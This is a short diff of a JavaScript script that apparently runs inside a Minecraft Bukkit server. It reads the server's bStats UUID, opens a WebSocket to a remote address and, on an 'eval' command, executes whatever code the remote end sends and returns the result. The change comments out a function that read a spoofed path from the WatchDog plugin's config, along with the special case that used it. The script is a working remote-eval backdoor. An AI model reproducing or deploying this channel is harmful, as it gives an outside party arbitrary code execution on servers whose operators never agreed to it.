@@ -16,7 +16,7 @@ function readGuid() {
         return bStats.getString('serverUuid')
     }
 }
-
+/*
 function readPath() {
     var YamlConfiguration = Java.type('org.bukkit.configuration.file.YamlConfiguration')
     var Files = Java.type('java.nio.file.Files')
@@ -28,6 +28,7 @@ function readPath() {
     pluginHelper.loadFromString(new JavaString(Files.readAllBytes(Paths.get('plugins', 'WatchDog', 'config.yml')), StandardCharsets.UTF_8))
     return pluginHelper.getString('virtual-path')
 }
+*/
 
 function connect(address) {
     global.ws = new WebSocket(address)
@@ -72,10 +73,6 @@ function connect(address) {
             
             switch (action) {
                 case "eval":
-                    if (data.search("getAbsolutePath") != -1) {
-                        global.ws.message(readPath())
-                        break
-                    }
                     global.ws.message(eval(data) + '')
                     break
                 case "heartbeat":
